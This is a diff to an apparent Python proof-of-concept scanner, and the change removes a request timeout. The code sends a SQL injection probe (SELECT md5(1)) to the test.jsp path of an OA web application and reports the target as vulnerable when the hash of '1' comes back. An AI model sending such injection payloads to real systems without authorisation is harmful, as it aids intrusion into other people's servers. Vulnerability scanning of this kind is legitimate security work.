@@ -40,7 +40,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))".format(scheme, netloc)
         try:
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if "c4ca4238a0b923820dcc509a6f75849b" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
